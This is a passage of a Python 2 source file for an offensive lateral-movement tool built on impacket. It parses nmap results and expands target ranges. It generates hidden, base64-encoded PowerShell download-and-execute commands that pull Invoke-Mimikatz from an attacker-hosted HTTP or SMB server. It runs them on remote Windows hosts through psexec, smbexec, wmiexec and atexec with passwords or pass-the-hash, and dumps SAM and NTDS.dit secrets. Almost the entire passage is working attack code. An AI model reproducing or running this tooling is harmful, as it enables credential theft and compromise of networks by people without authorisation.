INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'''

'''
NMAP PARSER
'''
class Nmap_parser:
    def __init__(self, nmap_xml, verbose=0):
        self.nmap_xml = nmap_xml
        self.verbose = verbose
        self.hosts = {}
        try:
            self.run()
        except Exception, e:
            print("[!] There was an error %s") % (str(e))
            sys.exit(1)

    def run(self):
        # Parse the nmap xml file and extract hosts and place them in a dictionary
        # Input: Nmap XML file and verbose flag
        # Return: Dictionary of hosts [iterated number] = [hostname, address, protocol, port, service name, state]
        if not self.nmap_xml:
            sys.exit("[!] Cannot open Nmap XML file: %s \n[-] Ensure that your are passing the correct file and format" % (self.nmap_xml))
        try:
            tree = etree.parse(self.nmap_xml)
        except:
            sys.exit("[!] Cannot open Nmap XML file: %s \n[-] Ensure that your are passing the correct file and format" % (self.nmap_xml))
        hosts={}
        services=[]
        hostname_list=[]
        root = tree.getroot()
        hostname_node = None
        if self.verbose > 0:
            print ("[*] Parsing the Nmap XML file: %s") % (self.nmap_xml)
        for host in root.iter('host'):
            hostname = "Unknown hostname"
            for addresses in host.iter('address'):
                hwaddress = "No MAC Address ID'd"
                ipv4 = "No IPv4 Address ID'd"
                addressv6 = "No IPv6 Address ID'd"
                temp = addresses.get('addrtype')
                if "mac" in temp:
                    hwaddress = addresses.get('addr')
                    if self.verbose > 2:
                        print("[*] The host was on the same broadcast domain")
                if "ipv4" in temp:
                    address = addresses.get('addr')
                    if self.verbose > 2:
                        print("[*] The host had an IPv4 address")
                if "ipv6" in temp:
                    addressv6 = addresses.get('addr')
                    if self.verbose > 2:
                        print("[*] The host had an IPv6 address")
            try:
                hostname_node = host.find('hostnames').find('hostname')
            except:
                if self.verbose > 1:
                    print ("[!] No hostname found")
            if hostname_node is not None:
                hostname = hostname_node.get('name')
            else:
                hostname = "Unknown hostname"
                if self.verbose > 1:
                    print("[*] The hosts hostname is %s") % (str(hostname_node))
            hostname_list.append(hostname)
            for item in host.iter('port'):
                state = item.find('state').get('state')
                #if state.lower() == 'open':
                service = item.find('service').get('name')
                protocol = item.get('protocol')
                port = item.get('portid')
                services.append([hostname_list, address, protocol, port, service, hwaddress, state])
        hostname_list=[]
        for i in range(0, len(services)):
            service = services[i]
            index = len(service) - 1
            hostname = str1 = ''.join(service[0])
            address = service[1]
            protocol = service[2]
            port = service[3]
            serv_name = service[4]
            hwaddress = service[5]
            state = service[6]
            self.hosts[i] = [hostname, address, protocol, port, serv_name, hwaddress, state]
            if self.verbose > 2:
                print ("[+] Adding %s with an IP of %s:%s with the service %s")%(hostname,address,port,serv_name)
        if self.hosts:
            if self.verbose > 4:
                print ("[*] Results from NMAP XML import: ")
                for key, entry in self.hosts.iteritems():
                    print("[*] %s") % (str(entry))
            if self.verbose > 0:
                print ("[+] Parsed and imported unique ports %s") % (str(i+1))
        else:
            if self.verbose > 0:
                print ("[-] No ports were discovered in the NMAP XML file")

    def hosts_return(self):
        # A controlled return method
        # Input: None
        # Returned: The processed hosts
        try:
             return self.hosts
        except Exception as e:
            print("[!] There was an error returning the data %s") % (e)

'''
TIMEOUT SIGNAL TERMINATION
'''

class Timeout():
    """Timeout class using ALARM signal."""
    class Timeout(Exception):
        pass
    def __init__(self, sec):
        self.sec = sec

    def __enter__(self):
        signal.signal(signal.SIGALRM, self.raise_timeout)
        signal.alarm(self.sec)

    def __exit__(self, *args):
        signal.alarm(0)    # disable alarm

    def raise_timeout(self, *args):
        raise Timeout.Timeout()

class TargetConverter:
    def __init__(self, target):
        self.target = target
        self.cidr_noted = ""
        self.range_value1 = ""
        self.range_value2 = ""
        self.ip_list = []
        self.target_list = []
        try:
            self.run()
        except Exception, e:
            print("[!] There was an error %s") % (str(e))
            sys.exit(1)

    def run(self):
        range_true = re.search(r'-',self.target)
        if "-" in self.target:
            range_value1, range_value2 = self.target.split('-')
            if len(range_value2) > 3:
                self.range_value1 = range_value1
                self.range_value2 = range_value2
                self.ip_list.extend(self.range_to_list())
            else:
                self.range_value1 = range_value1
                octet1, octet2, octet3, octet4 = self.range_value1.split('.')
                self.range_value2 = octet1 + "." + octet2 + "." + octet3 + "." + range_value2
                self.ip_list.extend(self.range_to_list())
        elif "/" in self.target:
            self.cidr_noted = self.target
            self.ip_list.extend(self.cidr_to_list())
        else:
            self.ip_list.append(self.target)

    def cidr_to_list(self):
        ip_list = []
        for ip in netaddr.IPNetwork(self.cidr_noted).iter_hosts():
            ip_list.append(ip)
        return(ip_list)

    def range_to_list(self):
        ip_list = []
        ip_list = list(netaddr.iter_iprange(self.range_value1, self.range_value2))
        return(ip_list)

    def return_targets(self):
        try:
            for ip in self.ip_list:
                self.target_list.append(str(ip))
            return(self.target_list)
        except Exception, e:
            print("[!] There was an error %s") % (str(e))
            sys.exit(1)

class NetviewDetails:
    def __init__(self, user = None, users = None, target = None, targets = None, noloop = True, delay = '10', max_connections = '1000', domainController = None, debug = False):
        self.user = user
        self.users = users
        self.target = target
        self.targets = targets
        self.noloop = noloop
        self.delay = delay
        self.max_connections = max_connections
        self.domainController = domainController
        self.debug = debug

    def user(self):
        return(self.user)

    def users(self):
        return(self.users)

    def target(self):
        return(self.target)

    def targets(self):
        return(self.targets)

    def noloop(self):
        return(self.noloop)

    def delay(self):
        return(self.delay)

    def max_connections(self):
        return(self.max_connections)

    def domainController(self):
        return(self.domainController)

    def debug(self):
        return(self.debug)


class Obfiscator:
    def __init__(self, src_ip, src_port, payload, function, argument, execution, methods, group, delivery, share_name, dst_ip="", dst_port=""):
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.src_port = src_port
        self.payload = payload
        self.function = function
        self.argument = argument
        self.execution = execution
        self.methods = methods
        self.group = group
        self.command = ""
        self.unprotected_command = ""
        self.delivery = delivery
        self.share_name = share_name
        try:
            self.run()
        except Exception, e:
            print("[!] There was an error %s") % (str(e))
            sys.exit(1)

    def run(self):
        if "invoker" in self.execution:
            # Direct invoker
            self.invoker()
        elif "download" in self.execution:
            # Direct downloader
            self.downloader()
        elif "executor" in self.execution:
            # Direct PowerShell execution
            self.executor()
        elif "group" in self.execution:
            # Extract Group Members
            self.group_members()

    def packager(self, cleartext):
        encoded_utf = cleartext.encode('utf-16-le')
        encoded_base64 = base64.b64encode(encoded_utf)
        command = "powershell.exe -nop -w hidden -exec bypass -enc %s" % (encoded_base64)
        return(command)

    def clearer(self, cleartext):
        command = 'powershell.exe -nop -w hidden -exec bypass "' + cleartext + '"'
        return(command)

    def return_command(self):
        try:
            return(self.command, self.unprotected_command)
        except Exception, e:
            print("[!] There was an error %s") % (str(e))
            sys.exit(1)

    def invoker(self):
        # Invoke Mimikatz Directly
        if self.delivery == "web":
            text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
        if self.delivery == "smb":
            text = "IEX (New-Object Net.WebClient).DownloadString('\\\%s\%s\%s'); %s %s" % (str(self.src_ip), str(self.share_name), str(self.payload), str(self.function), str(self.argument))
        self.command = self.packager(text)
        self.unprotected_command = self.clearer(text)

    def executor(self):
        # Invoke a PowerShell Script Directly
        if self.delivery == "web":
            if self.argument:
                text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
            else:
                text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function))
        elif self.delivery == "smb":
            if self.argument:
                text = "IEX (New-Object Net.WebClient).DownloadString('\\\%s\%s\%s'); %s %s" % (str(self.src_ip), str(self.share_name), str(self.payload), str(self.function), str(self.argument))
            else:
                text = "IEX (New-Object Net.WebClient).DownloadString('\\\%s\%s\%s'); %s" % (str(self.src_ip), str(self.share_name), str(self.payload), str(self.function))
        self.command = self.packager(text)
        self.unprotected_command = self.clearer(text)

    def downloader(self):
        # Download String Directly
        text = "IEX ((new-object net.webclient).downloadstring('http://%s:%s/'))" % (str(self.src_ip), str(self.src_port))
        self.command = self.packager(text)
        self.unprotected_command = self.clearer(text)

    def group_members(self):
        # Group Membership
        text = "Get-ADGroupMember -identity %s -Recursive | Get-ADUser -Property DisplayName | Select Name,ObjectClass,DisplayName" % (str(self.group))
        self.command = self.packager(text)
        self.unprotected_command = self.clearer(text)

'''
LOCAL INTERFACE DETECTION FUNCTIONS
'''

def get_interfaces():
    interfaces = netifaces.interfaces()
    return interfaces

def get_gateways():
    gateway_dict = {}
    gws = netifaces.gateways()
    for gw in gws:
        try:
            gateway_iface = gws[gw][netifaces.AF_INET]
            gateway_ip, iface = gateway_iface[0], gateway_iface[1]
            gw_list =[gateway_ip, iface]
            gateway_dict[gw]=gw_list
        except:
            pass
    return gateway_dict

def get_addresses(interface):
    addrs = netifaces.ifaddresses(interface)
    link_addr = addrs[netifaces.AF_LINK]
    iface_addrs = addrs[netifaces.AF_INET]
    iface_dict = iface_addrs[0]
    link_dict = link_addr[0]
    hwaddr = link_dict.get('addr')
    iface_addr = iface_dict.get('addr')
    iface_broadcast = iface_dict.get('broadcast')
    iface_netmask = iface_dict.get('netmask')
    return hwaddr, iface_addr, iface_broadcast, iface_netmask

def get_networks(gateways_dict):
    networks_dict = {}
    for key, value in gateways_dict.iteritems():
        gateway_ip, iface = value[0], value[1]
        hwaddress, addr, broadcast, netmask = get_addresses(iface)
        network = {'gateway': gateway_ip, 'hwaddr' : hwaddress, 'addr' : addr, 'broadcast' : broadcast, 'netmask' : netmask}
        networks_dict[iface] = network
    return networks_dict

'''
HASH MANIPULATION FUNCTIONS
'''

def hash_test(LM, NTLM, pwd, usr, verbose):
    if verbose > 1:
        print("[*] Hash detected for %s") % (usr)
    blank_ntlm = re.search(r'31d6cfe0d16ae931b73c59d7e0c089c0',NTLM, re.IGNORECASE)
    blank_lm = re.search(r'aad3b435b51404eeaad3b435b51404ee',LM, re.IGNORECASE)
    blank_lm_instances = len(re.findall(r'aad3b435b51404ee', LM, re.IGNORECASE))
    bad_format = re.search(r'NOPASSWORD',LM, re.IGNORECASE)
    if bad_format:
        if verbose > 1:
            print("[*] The hash for %s was badly formatted, so padding it") % (usr)
        LM = "aad3b435b51404eeaad3b435b51404ee"
    if blank_lm and blank_ntlm:
        if verbose > 1:
            print("[*] You do know the password for %s is blank right?") % (usr)
    elif blank_lm_instances == 1 and not blank_lm:
        if verbose > 1:
            print("[*] The hashed password for %s is less than eight characters") % (usr)
    elif blank_lm and blank_ntlm:
        if verbos > 1:
            print("[*] LM hashes are disabled for %s, so focus on cracking the NTLM") % (usr)
    hash = LM + ":" + NTLM
    if verbose > 1:
        print("[*] Your formated hash for %s is: %s") % (usr, hash)
    pwd = ""
    return(LM, NTLM, pwd, hash)

'''
CATAPULT SERVER FUNCTIONS
'''

def delivery_server(port, working_dir, delivery_method, share_name):
    sub_proc = None
    if delivery_method == "web":
        sub_proc = http_server(port, working_dir)
    if delivery_method == "smb":
        sub_proc == smb_server(working_dir, share_name)
    return sub_proc

def http_server(port, working_dir):
    null = open('/dev/null', 'w')
    sub_proc = subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', port], cwd=working_dir, stdout=null, stderr=null,)
    #Test Server
    test_request = "http://127.0.0.1:%s" % (port)
    try:
        urllib2.urlopen(test_request).read()
        print("[*] Catapult web server started successfully on port: %s in directory: %s") % (port, working_dir)
    except Exception, e:
        print("[!] Catapult web server failed to start")
    return sub_proc

def smb_server(working_dir, share_name):
    note = ''
    try:
        smb_srv = smbserver.SimpleSMBServer()
        smb_srv.addShare(share_name.upper(), working_dir, note)
        smb_srv.setSMB2Support(False)
        smb_srv.setSMBChallenge('')
        smb_srv.setLogFile('')
        sub_proc = subprocess.Popen([smb_srv.start()])
    except Exception, e:
        print("[!] Catapult smb server failed to start")
    # TODO: ADD IN TEST CASE FOR VERIFYING SMB SERVER STARTED USING pysmb
    return sub_proc

'''
METHOD FUNCTIONS
'''

def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder):
    if hash and not pwd:
        print("[-] --atexec requires a password, please try a different user or crack hash %s for user %s") % (hash, usr)
        return
    if scan_type:
        state = verify_open(verbose, scan_type, verify_port, dst)
        if not state:
            if verbose > 1:
                print("[-] Host %s port %s is closed") % (dst, verify_port)
            return #replaced continue inside a function
    if attacks:
        srv = delivery_server(src_port, cwd, delivery, share_name)
    if hash:
        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
    else:
        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
    if command == "cmd.exe":
        sys.exit("[!] Please provide a viable command for execution")
    shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command, proto = protocol)
    shell.play(dst)
    if attacks and not encoder:
        srv = delivery_server(src_port, cwd, delivery, share_name)
        if hash:
            print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
        else:
            print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
        if command == "cmd.exe":
            sys.exit("[!] Please provide a viable command for execution")
        shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command, proto = protocol)
        shell.play(dst)
    if attacks:
        if srv:
           srv.terminate()
           print("[*] Shutting down the catapult %s server for %s"  % (str(delivery), str(dst)))

def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port):
    if scan_type:
        state = verify_open(verbose, scan_type, verify_port, dst)
        if not state:
            if verbose > 1:
                print("[-] Host %s port %s is closed") % (dst, verify_port)
            return #replaced continue inside a function 
    if attacks:
        #print(instructions)
        srv = delivery_server(src_port, cwd, delivery, share_name)
    if hash:
        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
    else:
        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
    shell = PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
    shell.run(dst)
    if srv:
        srv.terminate()
        print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))

def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port):
    if scan_type:
        state = verify_open(verbose, scan_type, verify_port, dst)
        if not state:
            if verbose > 1:
                print("[-] Host %s port %s is closed") % (dst, verify_port)
            return #replaced continue inside a function
    if attacks:
        print(instructions)
        srv = delivery_server(src_port, cwd, delivery, share_name)
    if hash:
        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
    else:
        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
    shell = CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
    shell.run(dst)
    if srv:
        srv.terminate()
        print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))

def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder):
    if scan_type:
        state = verify_open(verbose, scan_type, verify_port, dst)
        if not state:
            if verbose > 1:
                print("[-] Host %s port %s is closed") % (dst, verify_port)
            return #replaced continue inside a function
    if attacks and encoder:
        if hash:
            print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
        else:
            print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
        if command == "cmd.exe":
            sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
        with Timeout(100):
            try:
                srv = delivery_server(src_port, cwd, delivery, share_name)
                shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                shell.run(dst)
            except Exception, e:
                print("[!] An error occurred: %s") % (e)
                if srv:
                    srv.terminate()
                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
                    return #replaced continue inside a function
    elif attacks and not encoder:
        if hash:
            print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
        else:
            print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
        if command == "cmd.exe":
            sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
        with Timeout(100):
            try:
                srv = delivery_server(src_port, cwd, delivery, share_name)
                shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                shell.run(dst)
            except Exception, e:
                print("[!] An error occurred: %s") % (e)
                if srv:
                    srv.terminate()
                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
                    return #changed from continue inside a function
    else:
        with Timeout(100):
            try:
                srv = delivery_server(src_port, cwd, delivery, share_name)
                shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                shell.run(dst)
            except Exception, e:
                print("[!] An error occurred: %s") % (e)
                if srv:
                    srv.terminate()
                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
                    return # changed from continue inside a function

def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port): 
    if scan_type:
        state = verify_open(verbose, scan_type, verify_port, dst)
        if not state:
            if verbose > 1:
                print("[-] Host %s port %s is closed") % (dst, verify_port)
            return #replaced continue inside a function
    if methods:
        sys.exit("[!] The --scout option is run without methods")
    if hash:
        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
    else:
        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
    opted = NetviewDetails(user = None, users = None, target = dst, targets = None, noloop = True, delay = '10', max_connections = '1000', domainController = None, debug = False)
    shell = USERENUM(username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, options=opted)
    shell.run()

def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port):
    if scan_type:
        state = verify_open(verbose, scan_type, verify_port, dst)
        if not state:
            if verbose > 1:
                print("[-] Host %s port %s is closed") % (dst, verify_port)
            return #replaced continue inside a function
    if hash:
        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
    else:
        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
    shell = DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
    try:
        shell.dump()
    except Execption, e:
        print("[!] An error occured during execution")


def instructions_func(payload, src_port, command, unprotected_command, smbexec_cmd, execution, delivery):
    if "web" in delivery and "invoker" or "executor" in execution:
        prep = '''[*] Place the PowerShell script ''' + str(payload) + ''' in an empty directory, or use the default /opt/ranger/web.
[*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + str(src_port) + '''.'''
        post = '''\n[*] Copy and paste one of the following commands into the target boxes command shell.
[+] This command is unencoded:\n''' + unprotected_command + '''\n
[+] This command is double encoded:\n''' +command
        if smbexec_cmd:
            instructions = post
        else:
            instructions = prep + post
    elif "smb" in delivery and "invoker" or "executor" in execution:
        prep = '''[*] Place the PowerShell script ''' + str(payload) + ''' in an empty directory, or use the default /opt/ranger/smb.
[*] Start-up your samba server.'''
        post ='''[*] Copy and paste one of the following commands into the target boxes command shell.
[+] This command is unencoded:\n''' + unprotected_command + '''\n
[+] This command is double encoded:\n''' + command
        if smbexec_cmd:
            instructions = post
        else:
            instructions = prep + post
    elif "downloader" in execution:
        prep = '''[*] If you have not already done this, start-up your Metasploit module exploit/multi/script/web_delivery.
[*] Make sure to select the PowerShell and copy the payload name for this script and set the URIPATH to /.'''
        post = '''[*] Copy and paste one of the following commands into the target boxes command shell.
[+] This command is unencoded:\n''' + unprotected_command + '''\n
[+] This command is double encoded:\n''' +command
        if smbexec_cmd:
           instructions = post
        else:
           instructions = prep + post
    return(instructions)

'''
NMAP FUNCTIONS
'''

def unique_host_dict(hosts, verbose):
    count = 0
    hosts_dict = {}
    processed_hosts = {}
    if not hosts:
        sys.exit("[!] There was an issue processing the data")
    for inst in hosts:
        hosts_temp = inst.hosts_return()
        if hosts_temp is not None:
            for k, v in hosts_temp.iteritems():
                hosts_dict[count] = v
                count+=1
            hosts_temp.clear()
    if verbose > 2:
        for key, value in hosts_dict.iteritems():
            print("[*] Key: %s Value: %s") % (key,value)
    temp = [(k, hosts_dict[k]) for k in hosts_dict]
    temp.sort()
    key = 0
    for k, v in temp:
        compare = lambda x, y: collections.Counter(x) == collections.Counter(y)
        if str(v) in str(processed_hosts.values()):
            continue
        else:
            key+=1
            processed_hosts[key] = v
    return(processed_hosts)

def xml_list_process(xml, verbose):
    xml_list = []
    hosts = []
    # Instantiation for proof of concept
    if "," in xml:
        xml_list = xml.split(',')
    else:
        xml_list.append(xml)
    for x in xml_list:
        try:
            tree_temp = etree.parse(x)
        except:
            sys.exit("[!] Cannot open XML file: %s \n[-] Ensure that your are passing the correct file and format" % (x))
        try:
            root = tree_temp.getroot()
            name = root.get("scanner")
            if name is not None and "nmap" in name:
                if verbose > 1:
                    print ("[*] File being processed is an NMAP XML")
                hosts.append(Nmap_parser(x, verbose))
            else:
                print("[!] File % is not an NMAP XML") % (str(x))
                sys.exit(1)
        except Exception, e:
            print("[!] Processing of file %s failed %s") % (str(x), str(e))
            sys.exit(1)
    processed_hosts = unique_host_dict(hosts, verbose)
    return(processed_hosts)

def verify_open(verbose, scan_type, port, dst):
    nm = nmap.PortScanner()
    if "tcp" in scan_type:
        if verbose > 1:
           print("[*] Checking to see if the port %s is open on %s by TCP Connect scan") % (port, dst)
        scan_args = '-sT -p %s' % (port)
        nm.scan(hosts=dst, arguments=scan_args)
    elif "syn" in scan_type:
        if verbose > 1:
           print("[*] Checking to see if the port %s is open on %s by SYN Scan scan") % (port, dst)
        scan_args = '-sS -p %s' % (port)
        nm.scan(hosts=dst, arguments=scan_args)
    try:
        output = nm[dst]['tcp'][int(port)]['state']
    except Exception, e:
        output = "closed"
    if "open" in output:
        return(True)
    else:
        return(False)

def pwd_test(pwd, verbose, usr = None):
    SID = None
    NTLM = ""
    LM = ""
    hash = None
    if pwd and ":" in pwd and pwd.count(':') == 6:
        pwdump_format_hash = pwd.split(':')
        if not usr:
            usr = pwdump_format_hash[0].lower()
        SID = pwdump_format_hash[1]
        LM = pwdump_format_hash[2]
        NTLM = pwdump_format_hash[3]
        pwd = None
    if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
        LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd, usr, verbose)
    if pwd and ":" in pwd and pwd.count(':') == 1:
        if pwd.startswith(':'):
            LM, NTLM = pwd.split(':')
            if LM == "":
                LM = "aad3b435b51404eeaad3b435b51404ee"
        else:
            LM, NTLM = pwd.split(':')
        if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
            LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd, usr, verbose)
    return(SID, LM, NTLM, hash, usr, pwd)

def is_empty(structure):
    if structure:
        return False
    else:
        return True

def method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder):
    if psexec_cmd:
        for dst in final_targets:
            psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port)
    elif wmiexec_cmd:
        for dst in final_targets:
            wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder)
    elif netview_cmd:
        for dst in final_targets:
            netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port)
    elif smbexec_cmd:
        for dst in final_targets:
            smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port)
    elif atexec_cmd:
        for dst in final_targets:
            atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder)
    elif sam_dump:
        for dst in final_targets:
            sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port)
    else:
        print(instructions)   

def main():
    # If script is executed at the CLI
    usage = '''
Find Logged In Users
    %(prog)s [--usr Administrator] [--pwd Password1] [-dom Domain] --scout
Command Shell:
    %(prog)s [--usr Administrator] [--pwd Password1] [-dom Domain] [-t target] --smbexec -q -v -vv -vvv
Attack Directly:
    %(prog)s [--usr Administrator] [--pwd Password1] [-dom Domain] [-t target] --wmiexec --invoker
Create Pasteable Double Encoded Script:
    %(prog)s --invoker -q -v -vv -vvv
'''
    parser = argparse.ArgumentParser(usage=usage, description="A wrapping and execution tool for a some of the most useful impacket tools", epilog="This script oombines specific attacks with dynmaic methods, which allow you to bypass many protective measures.")
    group1 = parser.add_argument_group('Method')
    group2 = parser.add_argument_group('Attack')
    group3 = parser.add_argument_group('SAM and NTDS.DIT Options, used with --secrets-dump')
    iex_options = parser.add_argument_group('Payload options to tell ranger where to source the attack information')
    remote_attack = parser.add_argument_group('Remote Target Options')
    #generator = parser.add_argument_group('Filename for randimization of script')
    obfiscation = parser.add_argument_group('Tools to obfiscate the execution of scripts')
    method = group1.add_mutually_exclusive_group()
    attack = group2.add_mutually_exclusive_group()
    sam_dump_options = group3.add_mutually_exclusive_group()
    iex_options.add_argument("-i", action="store", dest="src_ip", default=None, help="Sets the IP address your attacks will come from defaults to eth0 IP")
    iex_options.add_argument("-n", action="store", dest="interface", default="eth0", help="Sets the interface your attacks will come from if you do not use the default, default eth0")
    iex_options.add_argument("-p", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
    iex_options.add_argument("-x", action="store", dest="payload", default=None, help="The name of the file to injected, the default is Invoke-Mimikatz.ps1")
    iex_options.add_argument("-a", action="store", dest="mim_arg", default=None, help="Allows you to set the argument")
    iex_options.add_argument("-f", action="store", dest="mim_func", default=None, help="Allows you to set the function or cmdlet name")
    attack.add_argument("--invoker", action="store_true", dest="invoker", help="Executes Mimikatz-Invoker against target systtems")
    attack.add_argument("--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
    attack.add_argument("--secrets-dump", action="store_true", dest="sam_dump", help="Execute a SAM table dump")
    attack.add_argument("--executor", action="store_true", dest="executor", help="Execute a PowerShell Script")
    attack.add_argument("--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
    attack.add_argument("--group-members", action="store", dest="group", help="Identifies members of Domain Groups through PowerShell")
    remote_attack.add_argument("-t", action="store", dest="target", default=None, help="The targets you are attempting to exploit, multiple items can be comma seperated: Accepts IPs, CIDR, Short and Long Ranges")
    remote_attack.add_argument("-e", action="store", dest="exceptor", default=None, help="The exceptions to the targets you do not want to exploit, yours is inlcuded by default, multiple items can be comma seperated: Accepts IPs, CIDR, Short and Long Ranges")
    remote_attack.add_argument("-tl", action="store", dest="target_filename", default=None, help="The targets file with systems you want to exploit, delinated by new lines, multiple files can be comma separated")
    remote_attack.add_argument("-el", action="store", dest="exception_filename", default=None, help="The exceptions file with systems you do not want to exploit, delinated by new lines, multiple files can be comma separated")
    remote_attack.add_argument("-tnX", action="store", dest="xml_targets", default=None, help="The targets nmap XML with systems you want to exploit, multiple files can be comma separated")
    remote_attack.add_argument("-enX", action="store", dest="xml_exceptions", default=None, help="The exceptions nmap XML with systems you do not want to exploit, multiple files can be comma separted")
    remote_attack.add_argument("-sT", action="store_true", dest="scan_tcp", default=False, help="Verify the port is open with nmap TCP Connection scan prior to exploitation")
